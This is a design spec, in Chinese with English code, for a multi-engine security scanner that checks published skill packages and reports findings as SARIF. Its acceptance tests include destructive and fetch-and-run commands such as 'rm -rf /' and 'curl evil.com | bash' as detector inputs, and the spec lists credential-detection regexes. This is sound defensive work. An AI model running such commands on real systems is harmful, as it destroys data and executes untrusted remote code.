# S010: 多引擎安全掃描 Pipeline

> Spec: S010 | Size: M(12) | Status: ✅ Done
> Date: 2026-04-26
> Depends: S005 (✅ shipped) — RiskAssessmentListener、RiskScanner 由本 spec 替換
>          S007 (✅ shipped) — Spring AI Manual Configuration pattern 已驗證（embedding）

---

## 1. Goal

把 S005 的單一 regex scanner 換成 5 個可獨立開關的 SecurityAnalyzer，每筆 SkillVersionPublishedEvent 觸發一次 ScanOrchestrator：3 個靜態引擎並行 → LLM judge 序列 → MetaAnalyzer 跨引擎歸納，輸出符合 SARIF 2.1.0 的詳細報告，存入 `skill_versions.riskAssessment.sarif`。

簡單講：把目前只能說「LOW / MEDIUM / HIGH」的 scanner，升級成可以告訴使用者「在哪一個檔案的哪一行、命中什麼規則、屬於哪一個 OWASP 風險、為什麼是 HIGH」的多引擎報告系統。

```
┌─ SkillVersionPublishedEvent ────────────────────────────────────────┐
│                                                                      │
│  StorageService.download(zip)                                        │
│  PackageService.extractSkillMd / extractScripts                      │
│         │                                                            │
│         ▼                                                            │
│  ScanContext { skillId, version, frontmatter, skillMd, scripts }    │
│         │                                                            │
│         ├─── Phase 1 (parallel, virtual threads) ────────────────┐  │
│         │     PatternScanner    SecretScanner    MetadataValid.  │  │
│         │           │                 │                │          │  │
│         │           └─ findings + notices ─────────────┘          │  │
│         ▼                                                          │  │
│  enriched ScanContext (含 Phase 1 findings 摘要)                  │  │
│         │                                                          │  │
│         ├─── Phase 2 (sequential) ─────────────────────────────┐ │  │
│         │     LlmJudge (ChatClient → Gemini → LlmJudgement)    │ │  │
│         ▼                                                       │ │  │
│  enriched + LLM verdict                                          │ │  │
│         │                                                        │ │  │
│         ├─── Phase 3 (sequential, 5th engine) ────────────────┐ │ │  │
│         │     MetaAnalyzer (跨引擎一致性 / 累計關鍵字)         │ │ │  │
│         ▼                                                      │ │ │  │
│  Aggregate (max severity → riskLevel) + SARIF render            │ │ │  │
│         │                                                       │ │ │  │
│         ▼                                                       │ │ │  │
│  domain_events += SkillRiskAssessed                            │ │ │  │
│  skills.riskLevel 更新                                          │ │ │  │
│  skill_versions.{version}.riskAssessment {findings, notices,   │ │ │  │
│      sarif} 更新                                                │ │ │  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 2. Approach

### 2.1 比較

| Approach | Chosen | Rationale |
|----------|--------|-----------|
| A: `List<SecurityAnalyzer>` + virtual-thread parallel Phase 1 → sequential Phase 2/3 + 手寫 SARIF Jackson POJO + ChatClient.entity() | ⭐ yes | 引擎間無共享狀態 → 並行安全；Boot 4 已啟用 `spring.threads.virtual.enabled=true`；ChatClient.entity() 是 Spring AI 2.0.0-M4 推薦 API；SARIF Java lib 全都長期未維護（最新一個 2023-03，研究 R5），手寫 5 個 POJO 比管理 dead lib 風險低 |
| B: 全序列執行 5 引擎 | no | 慢；失去 virtual threads 優勢；publish 路徑被掃描時間綁死（含 LLM call）|
| C: `@Async` + `ThreadPoolTaskExecutor` | no | 已用虛擬執行緒不需平台執行緒池；`@Async` 額外 proxy 機制無法在同一 listener 內等所有引擎完成；硬解綁 transaction 邊界 |

### 2.2 與 S005 的差異

| 維度 | S005 | S010 |
|---|---|---|
| Scanner 數 | 1（regex） | 5（pattern / secret / metadata / llm / meta），各可獨立開關 |
| 掃描範圍 | `scripts/*` | `SKILL.md` + `scripts/*` + frontmatter |
| Finding 形狀 | `RiskFinding(type, message, file, line, pattern)` | `SecurityFinding(ruleId, severity, message, filePath, line, evidence, analyzer, owaspAst)` |
| 結果儲存 | `domain_events` payload `{level, count}` | 同上 + `skill_versions.{version}.riskAssessment.{findings, notices, sarif}` |
| LLM 介入 | 無 | LlmJudge 引擎（可關閉，預設關） |
| 設定 | 硬編碼 | `SkillshubProperties.Scanner` nested record |
| 執行 | 同步 listener，1 個 regex pass | 同步 listener；Phase 1 並行（虛擬執行緒）；Phase 2/3 序列 |

### 2.3 關鍵設計決策

1. **5 個引擎統一介面 `SecurityAnalyzer`，bean 名等於 enum value** — `List<SecurityAnalyzer>` 自動注入，引擎被 `@ConditionalOnProperty` 關掉時 bean 不建立、不出現在 list、SARIF 自動少一個 `runs[]`。沒有 null 處理。
2. **Phase 切割靠 `Phase` enum** — 每個 analyzer 宣告 `phase()`：`STATIC` / `LLM` / `META`。orchestrator 依 phase 分組。Phase 1（STATIC）並行，Phase 2/3 序列。
3. **手寫 SARIF Jackson POJO（5 類：SarifLog, Run, Tool, Result, Rule）** — 研究 R1 顯示三家 SARIF Java lib 全都長期未維護（contrast 2021、de-jcup 2023、qodana 0.2.x）。我們的 schema 表面只用 ~10% — 五個 record 就涵蓋。
4. **每個引擎 = 一個 SARIF run** — OASIS 2.1.0 規範 §3.1 規定 `tool.driver` 在 run 內必須單一身份，多引擎必須用多 runs。HIGH→`error`、MEDIUM→`warning`、LOW→`note`，並寫入 `properties.security-severity` 浮點分供未來 GHAS 整合（SEC-B9 backlog）。
5. **LlmJudge: ChatClient + entity()** — `ChatClient.create(chatModel).prompt().system(...).user(prompt).call().entity(LlmJudgement.class)`。`BeanOutputConverter` 自動把 record schema 注入 prompt。Gemini 支援 native structured output，加 `temperature=0.0` 求穩。
6. **LLM bean conditional on TWO 屬性同時存在** — `skillshub.scanner.engines.llm.enabled=true` AND `skillshub.genai.api-key` 非空。用 Spring 的 `AllNestedConditions` pattern。任一缺，bean 不建。
7. **MetaAnalyzer 是「確定性引擎」，不是第二輪 LLM** — 接收 Phase 1 + Phase 2 全部 findings，做跨引擎邏輯（例：3 個以上 HIGH → 加一個 `MULTI_HIGH_SIGNAL` finding；secret + dangerous-command 同檔 → 升級 owaspAst 標籤）。不調 LLM、零成本、預設開啟。
8. **嚴重度合併：Max severity** — `final = max(all findings.severity)`，HIGH > MEDIUM > LOW。`scripts/` 為空 + 全引擎無 finding → LOW（與 S005 行為一致）。
9. **取代 RiskAssessmentListener** — 既有的 listener 連同 RiskScanner / RiskFinding / 舊版 ScanResult 一起刪除。`SkillRiskAssessed` DomainEvent 仍存入 `domain_events`（payload 改為含 sarif refs），continued direct MongoTemplate write to `skills` 與 `skill_versions`（沿用 S005 §7 finding：避免循環依賴）。
10. **`SkillVersionReadModel` 加 `riskAssessment` 欄位** — S005 spec 規劃過但 design drift 沒實作；S010 補上。型別 `Map<String, Object>`，內容形如 `{level, findings:[…], notices:[…], sarif:{…}, scannedAt}`。

### 2.4 Challenges Considered

1. **Spring AI ChatModel 在 Boot 4.0.6 是否能 Manual Config？** S007 已驗證 embedding。Chat 是另一個 model 類型，雖然 starter 結構相似，但 `GoogleGenAiChatModel` 的建構參數（直接吃 `com.google.genai.Client`，不像 embedding 有 `GoogleGenAiEmbeddingConnectionDetails` wrapper）需要 POC 驗證。**POC: required**（見 §6）。
2. **`ChatClient.entity()` 對 record 的 schema 推斷穩不穩？** 研究 R5 顯示靠 `BeanOutputConverter` 用 Jackson 介紹 record components 自動產生 JSON Schema。實務上對小 record（≤ 10 fields）是穩的，但需 POC 驗一次。
3. **虛擬執行緒在 listener 內並行的 transaction 邊界** — `@EventListener` 本身在發布者交易內。但我們是 `@TransactionalEventListener` 還是 `@EventListener`？S005 用 `@EventListener` 同步，本 spec 沿用避免 race。三個 Phase 1 引擎本身不寫 DB（只計算 finding list），無 transaction 影響。
4. **Two `@ConditionalOnProperty` 不能直接疊加** — Java 不允許同型別 annotation 兩次，Spring 文件推薦的解法是 `AllNestedConditions` 子類 + `@Conditional`。這是已知 pattern，列入 §4 範例。
5. **SARIF 文件量** — 5 引擎 × 每筆 finding 一 result，加 SKILL.md 一份的 zip，估每次掃描 < 50 KB。寫進 `skill_versions.riskAssessment.sarif` 不超 Firestore 1 MB document limit。
6. **Manual Config 與 auto-config 衝突** — Spring AI 的 `GoogleGenAiChatAutoConfiguration` 同樣會在 classpath 看到 google-genai 後自動建立 `chatModel` bean。S009 規範要求設 `spring.ai.model.chat: none` 加排除 `GoogleGenAiChatAutoConfiguration`，與 embedding 已有的處置同一套路。

### 2.5 POC: required

| Hypothesis | 為何研究無法回答 | POC 範圍 |
|---|---|---|
| `GoogleGenAiChatModel` 可用 `Client.builder().apiKey(key).build()` 在 Boot 4.0.6 啟動且回傳合理結果 | Spring AI docs 寫 chat 但專案僅用過 embedding；2.0.0-M4 是 milestone，API 偶有 drift | 寫一個 `@SpringBootTest` 試 `chatClient.prompt().user("ping").call().content()` 拿到非空字串 |
| `ChatClient.entity(LlmJudgement.class)` 對 record + nested list 能正確 round-trip | `BeanOutputConverter` 對 nested types 的 schema 推斷有過 GitHub issues（R5 引用）| 同一 test，呼叫 `.entity(LlmJudgement.class)` 拿到非 null 物件，severity 欄位是合法 enum value |
| `AllNestedConditions` 對「engine.llm.enabled=true AND genai.api-key non-empty」雙條件正確 evaluation | Spring docs 範例少 | 改 properties 三種組合（兩條都有 / 缺其一 / 全缺），驗 bean 出現 / 缺席 |

POC 全綠才進 implementing-task 階段。

### 2.6 Research Citations

| # | 來源 | 摘要 |
|---|---|---|
| R1 | [OASIS SARIF v2.1.0 spec](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html) §3.1, §3.20.21, §3.27.10 | Multi-tool 必須 multi-runs；findings → `results[]`、informational → `invocations.toolExecutionNotifications`；level 四值 `error`/`warning`/`note`/`none` |
| R2 | [GitHub SARIF support](https://docs.github.com/en/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning) | `properties.security-severity` 浮點字串供 GHAS 嚴重度 banding（SEC-B9 backlog 預留） |
| R3 | [Spring AI 2.0.0-M4 ChatModel source](https://github.com/spring-projects/spring-ai/blob/v2.0.0-M4/models/spring-ai-google-genai/src/main/java/org/springframework/ai/google/genai/GoogleGenAiChatModel.java) | enum 含 `GEMINI_2_5_FLASH` / `GEMINI_2_5_PRO`；builder 接受 `genAiClient` + `defaultOptions` |
| R4 | [Spring AI BeanOutputConverter](https://github.com/spring-projects/spring-ai/blob/v2.0.0-M4/spring-ai-model/src/main/java/org/springframework/ai/converter/BeanOutputConverter.java) | record components → JSON Schema Draft 2020-12 自動推斷；`ChatClient.entity()` 內部使用 |
| R5 | [Java SARIF 函式庫盤點](https://github.com/Contrast-Security-OSS/java-sarif), [de-jcup/sarif-java](https://github.com/de-jcup/sarif-java), [JetBrains/qodana-sarif](https://github.com/JetBrains/qodana-sarif) | 三家全長期低活動，最新一次 release 都 ≥ 1 年前；建議手寫 |
| R6 | [gitleaks/config/gitleaks.toml](https://github.com/gitleaks/gitleaks/blob/master/config/gitleaks.toml) (MIT) | 借 10 條 secret regex；MIT 授權僅需保留版權聲明 |
| R7 | [Spring 6.2 / Boot 4 task execution](https://docs.spring.io/spring-boot/reference/features/task-execution-and-scheduling.html) | `spring.threads.virtual.enabled=true`（專案已啟用）使 `SimpleAsyncTaskExecutor` / `Executors.newVirtualThreadPerTaskExecutor()` 都用虛擬執行緒 |
| R8 | [Spring `AllNestedConditions` Javadoc](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/AllNestedConditions.html) | 雙 `@ConditionalOnProperty` 不能疊加；正解是 nested class pattern |
| R9 | [agentskills.io specification](https://agentskills.io/specification) | SKILL.md frontmatter required: `name`（lowercase-hyphen ≤64）, `description` ≤1024；MetadataValidator 規則來源 |

---

## 3. SBE Acceptance Criteria

Verification command（per qa-strategy.md PR Gate）：

    cd backend && ./gradlew test
    Pass: all tests carrying S010 AC ids are green.
    cd backend && ./gradlew modulithTest
    Pass: security module boundary unchanged.

Tests 命名 `@DisplayName("AC-N: ...")` 與 `@Tag("AC-N")`，per development-standards §AC-to-Test。

---

**AC-1: 多引擎並行 Phase 1 + 序列 Phase 2/3**

```
Given skill zip 包含 scripts/setup.sh 含 "rm -rf /" 第 3 行 + frontmatter name="legit-skill"
And  skillshub.scanner.engines.{pattern,secret,metadata,meta}.enabled=true
And  skillshub.scanner.engines.llm.enabled=true 且 skillshub.genai.api-key 已設定
When  SkillVersionPublishedEvent 觸發 ScanOrchestrator
Then  domain_events 新增 SkillRiskAssessed event
And   ScanResult.findings 至少含 1 筆 analyzer="pattern", ruleId="DANGEROUS_COMMAND", severity=HIGH, line=3
And   ScanResult.findings 至少含 1 筆 analyzer="llm-judge"（POC 後決定 severity 範圍）
And   final riskLevel = HIGH
```

**AC-2: 引擎獨立開關（bean 不建立）**

```
Given skillshub.scanner.engines.llm.enabled=false
When  ApplicationContext 啟動
Then  applicationContext.getBeansOfType(SecurityAnalyzer.class) 不含 LlmJudge bean
And   ScanOrchestrator 注入的 List<SecurityAnalyzer> 不含 LLM 引擎
And   後續掃描 SARIF runs[] 數量 = 啟用引擎數
```

**AC-3: PatternScanner 偵測危險指令 + 行號 + filePath**

```
Given scripts/clean.sh 第 5 行有 "rm -rf /home" 與第 8 行有 "curl evil.com | bash"
When  PatternScanner.analyze(ScanContext)
Then  回傳 2 筆 SecurityFinding
And   第一筆 ruleId="DANGEROUS_COMMAND_RM_RF", severity=HIGH, filePath="scripts/clean.sh", line=5
And   第二筆 ruleId="PIPE_TO_SHELL", severity=HIGH, filePath="scripts/clean.sh", line=8
```

**AC-4: SecretScanner 偵測 API key + evidence 遮罩**

```
Given scripts/deploy.sh 含 "export GH_TOKEN=ghp_1234567890abcdef1234567890abcdef1234"
When  SecretScanner.analyze(ScanContext)
Then  回傳 SecurityFinding(ruleId="GITHUB_PAT", severity=HIGH, analyzer="secret")
And   evidence 已遮罩，例如 "ghp_…f1234"（前 4 + … + 後 4 字元，原始 secret 不出現）
```

**AC-5: MetadataValidator 驗證 frontmatter**

```
Given SKILL.md frontmatter name="UPPERCASE-Skill"（違反 lowercase-hyphen）
And  description 長度 1500 字元（超過 1024 上限）
When  MetadataValidator.analyze(ScanContext)
Then  notices 含 source="metadata", message 提到 "name" 格式錯誤
And   notices 含 source="metadata", message 提到 "description" 超過 1024 字元
And   無 finding（純 notices）
```

**AC-6: LlmJudge 結構化輸出 + Phase 1 enrichment 可見**

```
Given Phase 1 已產出 1 筆 HIGH finding "DANGEROUS_COMMAND" 在 scripts/setup.sh:3
And  LLM bean 已建立（mock ChatModel）
When  LlmJudge.analyze(enrichedContext)
Then  ChatClient.prompt() 的 user message 含 "Phase 1 findings: [DANGEROUS_COMMAND@scripts/setup.sh:3]"
And   LLM 回傳 LlmJudgement 結構化 JSON 後，產生 0 或多筆 SecurityFinding(analyzer="llm-judge")
And   每筆 finding.severity ∈ {HIGH, MEDIUM, LOW}
```

**AC-7: SARIF 2.1.0 輸出（每引擎一 run）**

```
Given 4 個引擎啟用（pattern, secret, metadata, meta；llm 關閉）並各產出 ≥ 1 finding/notice
When  SarifReporter.render(ScanResult)
Then  輸出 JSON 通過 SARIF 2.1.0 schema validator（assertion via JsonNode 結構檢查）
And   $schema 指向 SARIF 2.1.0
And   runs[] 長度 = 4（pattern, secret, metadata, meta）
And   每個 run.tool.driver.name 對應引擎名
And   results[] 中 severity=HIGH 的 finding 對應 level="error"，MEDIUM→"warning"，LOW→"note"
And   每個 result.properties."security-severity" 為合法浮點字串
```

**AC-8: 結果寫入 read model**

```
Given AC-1 場景的 skill 完成掃描
When  讀 skill_versions document
Then  document.riskAssessment 不為 null
And   riskAssessment.level = "HIGH"
And   riskAssessment.findings 是 array 且非空
And   riskAssessment.sarif.version = "2.1.0"
And   skills.{skillId}.riskLevel = "HIGH"
```

---

## 4. Interface / API Design

### 4.1 Core records & interfaces

```java
package io.github.samzhu.skillshub.security.scan;

public enum Severity { HIGH, MEDIUM, LOW }

public enum Phase { STATIC, LLM, META }

public record ScanContext(
    String skillId,
    String version,
    Map<String, Object> frontmatter,    // 由 SkillVersionPublishedEvent.frontmatter 帶入
    String skillMd,                     // 從 zip 提取的 SKILL.md 全文
    Map<String, String> scripts,        // 由 PackageService.extractScripts 帶入
    List<SecurityFinding> phase1Findings // 給 Phase 2/3 用，Phase 1 期間為 List.of()
) {
    public ScanContext withPhase1Findings(List<SecurityFinding> fs) {
        return new ScanContext(skillId, version, frontmatter, skillMd, scripts, fs);
    }
}

public record SecurityFinding(
    String ruleId,        // e.g. "DANGEROUS_COMMAND_RM_RF"
    Severity severity,
    String message,
    String filePath,      // nullable（SKILL.md 為 "SKILL.md"，frontmatter 為 null）
    Integer line,         // nullable
    String evidence,      // nullable / 遮罩過
    String analyzer,      // "pattern" | "secret" | "metadata" | "llm-judge" | "meta"
    String owaspAst       // nullable, e.g. "AST01"
) {}

public record ScanNotice(String source, String message) {}

public record ScanResult(
    Severity finalLevel,                  // = HIGH > MEDIUM > LOW > none(=LOW)
    List<SecurityFinding> findings,
    List<ScanNotice> notices,
    Map<String, Object> sarif             // SARIF JSON 解析後的 Map（給 Mongo 直接序列化）
) {}

public interface SecurityAnalyzer {
    String name();                          // bean unique name & SARIF tool.driver.name
    Phase phase();
    AnalysisOutput analyze(ScanContext ctx);
}

public record AnalysisOutput(List<SecurityFinding> findings, List<ScanNotice> notices) {
    public static AnalysisOutput empty() { return new AnalysisOutput(List.of(), List.of()); }
}
```

### 4.2 Orchestrator

```java
@Component
class ScanOrchestrator {
    private static final Logger log = LoggerFactory.getLogger(ScanOrchestrator.class);
    private final List<SecurityAnalyzer> analyzers;
    private final StorageService storage;
    private final PackageService packages;
    private final DomainEventRepository eventStore;
    private final MongoTemplate mongo;
    private final SarifReporter sarifReporter;
    private final Executor virtualExecutor = Executors.newVirtualThreadPerTaskExecutor();

    @EventListener
    void on(SkillVersionPublishedEvent evt) {
        try {
            var ctx = buildContext(evt);

            // Phase 1: 並行
            var phase1 = runParallel(byPhase(Phase.STATIC), ctx);

            // Enrichment
            var enriched = ctx.withPhase1Findings(phase1.findings());

            // Phase 2: LLM 序列（0 或 1 個引擎）
            var phase2 = runSequential(byPhase(Phase.LLM), enriched);

            // Phase 3: Meta 序列（聚合所有前面結果）
            var combined = combine(phase1, phase2);
            var metaCtx = enriched.withPhase1Findings(combined.findings());
            var phase3 = runSequential(byPhase(Phase.META), metaCtx);

            var all = combine(combined, phase3);
            var finalLevel = aggregateMaxSeverity(all.findings());
            var sarif = sarifReporter.render(analyzers, all, evt);
            var result = new ScanResult(finalLevel, all.findings(), all.notices(), sarif);

            persist(evt, result);
        } catch (Exception e) {
            log.error("Scan pipeline failed for skill {} v{}: {}",
                evt.aggregateId(), evt.version(), e.toString());
        }
    }

    private AnalysisOutput runParallel(List<SecurityAnalyzer> as, ScanContext ctx) {
        var futures = as.stream()
            .map(a -> CompletableFuture.supplyAsync(() -> safe(a, ctx), virtualExecutor))
            .toList();
        CompletableFuture.allOf(futures.toArray(CompletableFuture[]::new)).join();
        return merge(futures.stream().map(CompletableFuture::join).toList());
    }

    private AnalysisOutput runSequential(List<SecurityAnalyzer> as, ScanContext ctx) {
        var outs = as.stream().map(a -> safe(a, ctx)).toList();
        return merge(outs);
    }

    private AnalysisOutput safe(SecurityAnalyzer a, ScanContext ctx) {
        try { return a.analyze(ctx); }
        catch (Exception e) {
            log.warn("Analyzer {} failed: {}", a.name(), e.toString());
            return AnalysisOutput.empty();
        }
    }
    // … byPhase / combine / aggregateMaxSeverity / persist 略
}
```

### 4.3 Engines

```java
// Phase 1 — 預設啟用
@Component("pattern")
@ConditionalOnProperty(name = "skillshub.scanner.engines.pattern.enabled",
                       havingValue = "true", matchIfMissing = true)
class PatternScanner implements SecurityAnalyzer { /* 取代 RiskScanner，規則擴充 */ }

@Component("secret")
@ConditionalOnProperty(name = "skillshub.scanner.engines.secret.enabled",
                       havingValue = "true", matchIfMissing = true)
class SecretScanner implements SecurityAnalyzer {
    // ~10 條 patterns（gitleaks 啟發、MIT），常數 List<Pattern>
    // - AKIA[0-9A-Z]{16}            AWS_ACCESS_KEY_ID
    // - AIza[0-9A-Za-z_-]{35}        GOOGLE_API_KEY
    // - ghp_[A-Za-z0-9]{36}          GITHUB_PAT
    // - github_pat_[A-Za-z0-9_]{82}  GITHUB_FINE_GRAINED_PAT
    // - sk-[A-Za-z0-9]{48}           OPENAI_KEY
    // - eyJ…\.eyJ…\.[…]              JWT
    // - -----BEGIN [A-Z ]*PRIVATE KEY-----  PEM_PRIVATE_KEY
    // - https://hooks.slack.com/services/T…/B…/…  SLACK_WEBHOOK
    // - (?i)bearer\s+[A-Za-z0-9._~+/-]{20,}  GENERIC_BEARER
    // - (?i)(password|passwd|pwd)\s*[:=]\s*['"][^'"]{8,}['"]  GENERIC_PASSWORD
    // evidence 遮罩：前 4 字元 + "…" + 後 4 字元
}

@Component("metadata")
@ConditionalOnProperty(name = "skillshub.scanner.engines.metadata.enabled",
                       havingValue = "true", matchIfMissing = true)
class MetadataValidator implements SecurityAnalyzer {
    // 用 Jakarta jakarta.validation.Validator + 一個內部 record SkillFrontmatter
    //   @Pattern(regexp="[a-z][a-z0-9-]*") @Size(max=64) String name
    //   @Size(max=1024) String description
    //   @Pattern(regexp="\\d+\\.\\d+\\.\\d+(-.+)?") String version  // optional
    // ConstraintViolation → ScanNotice（不發 finding，僅是 lint-style 提示）
}

// Phase 2 — 預設關閉（需要 API key 才上線）
@Component("llm-judge")
@Conditional(LlmEnabledCondition.class)   // engine.llm.enabled=true AND genai.api-key 存在
class LlmJudge implements SecurityAnalyzer {
    private final ChatClient chatClient;     // ScannerAiConfig 提供
    @Override public Phase phase() { return Phase.LLM; }
    @Override public AnalysisOutput analyze(ScanContext ctx) {
        var prompt = """
            You are a security auditor. Evaluate this skill package.
            Phase 1 already found: %s
            ---FRONTMATTER---
            %s
            ---SKILL.MD---
            %s
            ---SCRIPTS---
            %s
            """.formatted(summarizePhase1(ctx), ctx.frontmatter(), trim(ctx.skillMd()), trim(ctx.scripts()));
        var verdict = chatClient.prompt()
            .system("Return strictly the LlmJudgement JSON schema. severity ∈ {HIGH, MEDIUM, LOW}.")
            .user(prompt)
            .call()
            .entity(LlmJudgement.class);
        return verdict.toAnalysisOutput();    // claims → SecurityFinding(analyzer="llm-judge")
    }
}

// Phase 3 — 預設啟用
@Component("meta")
@ConditionalOnProperty(name = "skillshub.scanner.engines.meta.enabled",
                       havingValue = "true", matchIfMissing = true)
class MetaAnalyzer implements SecurityAnalyzer {
    // 跨引擎邏輯，不調 LLM。範例規則：
    //   - 同一檔案被 ≥3 引擎回報 → 升一個 META_MULTI_ENGINE finding（severity=max+1，capped HIGH）
    //   - secret 與 dangerous-command 同檔 → META_EXFIL_PATTERN(HIGH, owaspAst="AST06")
    //   - frontmatter 缺 description + scripts 含外部 URL → META_OPACITY(MEDIUM)
}
```

### 4.4 LlmJudgement (structured output target)

```java
public record LlmJudgement(
    String verdict,                  // "SAFE" | "SUSPICIOUS" | "MALICIOUS"
    String reasoning,                // 1-3 sentences
    List<RiskClaim> claims
) {
    public record RiskClaim(
        String ruleId,               // 自由命名，e.g. "OBFUSCATED_INTENT"
        Severity severity,
        String message,
        String filePath,             // nullable
        Integer line,                // nullable
        String owaspAst              // nullable
    ) {}

    public AnalysisOutput toAnalysisOutput() {
        var findings = claims.stream()
            .map(c -> new SecurityFinding(c.ruleId(), c.severity(), c.message(),
                c.filePath(), c.line(), null, "llm-judge", c.owaspAst()))
            .toList();
        return new AnalysisOutput(findings, List.of(new ScanNotice("llm-judge", reasoning)));
    }
}
```

### 4.5 ScannerAiConfig (Manual Config, follows S009 standards)

```java
@Configuration
@AutoConfigureAfter({GoogleGenAiEmbeddingAutoConfiguration.class})
class ScannerAiConfig {

    static class LlmEnabledCondition extends AllNestedConditions {
        LlmEnabledCondition() { super(ConfigurationPhase.REGISTER_BEAN); }
        @ConditionalOnProperty(name = "skillshub.scanner.engines.llm.enabled",
                               havingValue = "true")
        static class EngineEnabled {}
        @ConditionalOnProperty(name = "skillshub.genai.api-key")
        static class ApiKeyPresent {}
    }

    @Bean
    @Conditional(LlmEnabledCondition.class)
    GoogleGenAiChatModel scannerChatModel(SkillshubProperties props) {
        var client = com.google.genai.Client.builder()
            .apiKey(props.genai().apiKey())
            .build();
        var options = GoogleGenAiChatOptions.builder()
            .model(GoogleGenAiChatModel.ChatModel.GEMINI_2_5_FLASH)   // [POC 修正] AbstractBuilder.model 只接受 enum
            .temperature(0.0)
            .build();
        return GoogleGenAiChatModel.builder()
            .genAiClient(client)
            .defaultOptions(options)
            .build();
    }

    @Bean
    @Conditional(LlmEnabledCondition.class)
    ChatClient scannerChatClient(GoogleGenAiChatModel m) { return ChatClient.create(m); }
}
```

### 4.6 SkillshubProperties extension

```java
@ConfigurationProperties(prefix = "skillshub")
public record SkillshubProperties(
    @DefaultValue Storage storage,
    @DefaultValue Search search,
    @DefaultValue GenAI genai,
    @DefaultValue Scanner scanner) {        // ← new

    public record Scanner(
        @DefaultValue Engines engines) {}

    public record Engines(
        @DefaultValue Engine pattern,
        @DefaultValue Engine secret,
        @DefaultValue Engine metadata,
        @DefaultValue("false") String llmEnabledRaw,        // 預設 false
        @DefaultValue Engine meta) {
        public Engine llm() { return new Engine(Boolean.parseBoolean(llmEnabledRaw)); }
    }

    public record Engine(@DefaultValue("true") boolean enabled) {}
    // …existing Storage / Search / GenAI 不變
}
```

> **[Implementation note]** 上方的 `String llmEnabledRaw` + 計算式 `llm()` 設計**沒有採用**。
> 實作改為：所有 5 個欄位都用同一個 `Engine` 型別（預設 `enabled=true`），
> 透過 `application.yaml` 的 `skillshub.scanner.engines.llm.enabled: false` 覆蓋預設。
> 原因：`@DefaultValue("false")` 不能繫結到 record 型別參數，只能對 scalar/string 生效。
> Engine bean 仍由 `LlmEnabledCondition`（雙條件 gate）決定是否建立，與 `Engines.llm.enabled`
> 配合運作。Bean 條件邏輯與功能行為與設計意圖完全等價。詳見 §7 Key Findings 與 T1 task result。

`application.yaml`：

```yaml
skillshub:
  scanner:
    engines:
      pattern:   { enabled: true }
      secret:    { enabled: true }
      metadata:  { enabled: true }
      llm:       { enabled: false }   # API key 未設或要省 LLM cost 時關閉
      meta:      { enabled: true }
```

### 4.7 SARIF 2.1.0 Reporter (hand-rolled Jackson POJOs)

```java
public record SarifLog(
    @JsonProperty("$schema") String schema,
    String version,
    List<Run> runs) {}
public record Run(Tool tool, List<Result> results, List<Invocation> invocations) {}
public record Tool(Driver driver) {}
public record Driver(String name, String semanticVersion, List<Rule> rules) {}
public record Rule(String id, ShortDesc shortDescription, Help help) {}
public record Result(
    String ruleId, String level,            // "error"|"warning"|"note"
    Message message, List<Location> locations,
    Map<String, Object> properties) {}      // 含 "security-severity"
// + Message / Location / PhysicalLocation / ArtifactLocation / Region / Invocation
```

`SarifReporter.render(...)`：每個 enabled analyzer 一個 `Run`；HIGH→error / MEDIUM→warning / LOW→note；`security-severity` 浮點字串 8.5 / 5.0 / 2.5。輸出 `Map<String, Object>` 給 Mongo 直接序列化。

### 4.8 SkillVersionReadModel 擴充

```java
@Document("skill_versions")
public record SkillVersionReadModel(
    @Id String id,
    String skillId,
    String version,
    String storagePath,
    long fileSize,
    Map<String, Object> frontmatter,
    Map<String, Object> riskAssessment,    // ← new, nullable until scan completes
    Instant publishedAt
) {}
```

`riskAssessment` 範例：

```json
{
  "level": "HIGH",
  "findings": [
    {"ruleId": "DANGEROUS_COMMAND_RM_RF", "severity": "HIGH",
     "filePath": "scripts/clean.sh", "line": 5, "analyzer": "pattern", "owaspAst": "AST06"}
  ],
  "notices": [{"source": "metadata", "message": "description exceeds 1024 chars"}],
  "sarif": { "$schema": "https://docs.oasis-open.org/sarif/...", "version": "2.1.0", "runs": [...] },
  "scannedAt": "2026-04-25T10:23:11Z"
}
```

---

## 5. File Plan

### 新增

| # | 路徑（`io.github.samzhu.skillshub.security.scan` 下） | 說明 |
|---|---|---|
| 1 | `Severity.java` | enum HIGH/MEDIUM/LOW |
| 2 | `Phase.java` | enum STATIC/LLM/META |
| 3 | `SecurityFinding.java` | finding record |
| 4 | `ScanNotice.java` | notice record |
| 5 | `ScanContext.java` | input + enrichment record |
| 6 | `ScanResult.java` | 新版 result record |
| 7 | `AnalysisOutput.java` | per-engine 回傳 record |
| 8 | `SecurityAnalyzer.java` | engine SPI |
| 9 | `ScanOrchestrator.java` | listener + pipeline |
| 10 | `engines/PatternScanner.java` | 取代 RiskScanner，含 SKILL.md + scripts/ scanning |
| 11 | `engines/SecretScanner.java` | ~10 條 patterns + 遮罩 |
| 12 | `engines/MetadataValidator.java` | Jakarta Validation + agentskills 規則 |
| 13 | `engines/LlmJudge.java` | ChatClient.entity() |
| 14 | `engines/MetaAnalyzer.java` | 跨引擎合併規則 |
| 15 | `engines/LlmJudgement.java` | structured output target record |
| 16 | `ScannerAiConfig.java` | Manual Config for ChatModel + ChatClient |
| 17 | `LlmEnabledCondition.java` | AllNestedConditions（也可 inner class，視 §4.5）|
| 18 | `sarif/SarifReporter.java` | 渲染 SarifLog |
| 19 | `sarif/SarifModels.java` | SarifLog / Run / Result … 五個 record（同檔好維護） |

### 修改

| 路徑 | 變更 |
|---|---|
| `security/RiskAssessmentListener.java` | **刪除**（被 ScanOrchestrator 取代）|
| `security/RiskScanner.java` | **刪除**（被 PatternScanner 取代）|
| `security/RiskFinding.java` | **刪除**（被 SecurityFinding 取代）|
| `security/ScanResult.java` | **刪除**（被 scan/ScanResult 取代）|
| `security/RiskLevel.java` | **保留**（仍用作對外 read model 的 severity 字串值）|
| `security/package-info.java` | 不變 — `allowedDependencies` 已含 `shared::events`、`skill::domain`、`storage` |
| `SkillshubProperties.java` | 加 nested record `Scanner` + `Engines` + `Engine` |
| `skill/query/SkillVersionReadModel.java` | 加 `riskAssessment Map<String,Object>` 欄位 |
| `backend/src/main/resources/application.yaml` | 加 `skillshub.scanner.engines.*` block |
| `backend/src/main/resources/application-gcp.yaml` | 預設 `engines.llm.enabled: true`（gcp profile 才啟用 LLM）|
| `backend/src/test/resources/application.yaml` | `engines.llm.enabled: false`（測試不打 API）|
